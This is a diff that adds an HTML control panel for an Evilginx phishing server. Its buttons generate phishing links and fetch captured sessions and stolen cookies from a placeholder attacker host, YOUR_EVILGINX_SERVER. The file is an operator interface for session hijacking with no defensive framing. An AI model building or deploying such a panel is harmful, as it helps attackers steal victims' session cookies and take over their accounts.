@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+</head>
+<body class="bg-gray-100">
+    <div class="flex h-screen">
+        <!-- Sidebar -->
+        <aside class="w-64 bg-gray-900 text-white flex flex-col">
+            <div class="p-6 text-center text-2xl font-bold">Dashboard</div>
+            <nav class="flex-grow">
+                <button id="generate-link" class="block w-full px-6 py-3 text-lg hover:bg-gray-700">Generate Link</button>
+                <button id="view-cookies" class="block w-full px-6 py-3 text-lg hover:bg-gray-700">Cookies</button>
+                <button id="view-sessions" class="block w-full px-6 py-3 text-lg hover:bg-gray-700">Captured Sessions</button>
+                <button id="logout" class="block w-full px-6 py-3 text-lg hover:bg-red-700">Logout</button>
+            </nav>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="flex-grow p-8">
+            <h1 class="text-3xl font-bold">Welcome to Your Dashboard</h1>
+            <div id="data-display" class="mt-6"></div>
+        </main>
+    </div>
+
+    <script>
+        document.getElementById("logout").addEventListener("click", () => {
+            firebase.auth().signOut().then(() => {
+                window.location.href = "index.html";
+            });
+        });
+
+        document.getElementById("generate-link").addEventListener("click", () => {
+            fetch("http://YOUR_EVILGINX_SERVER/api/generate", { method: "POST" })
+                .then(response => response.json())
+                .then(data => alert("Generated Link: " + data.link))
+                .catch(error => console.error(error));
+        });
+
+        document.getElementById("view-sessions").addEventListener("click", () => {
+            fetch("http://YOUR_EVILGINX_SERVER/api/sessions")
+                .then(response => response.json())
+                .then(data => document.getElementById("data-display").innerHTML = JSON.stringify(data, null, 2))
+                .catch(error => console.error(error));
+        });
+
+        document.getElementById("view-cookies").addEventListener("click", () => {
+            fetch("http://YOUR_EVILGINX_SERVER/api/cookies")
+                .then(response => response.json())
+                .then(data => document.getElementById("data-display").innerHTML = JSON.stringify(data, null, 2))
+                .catch(error => console.error(error));
+        });
+    </script>
+</body>
+</html>
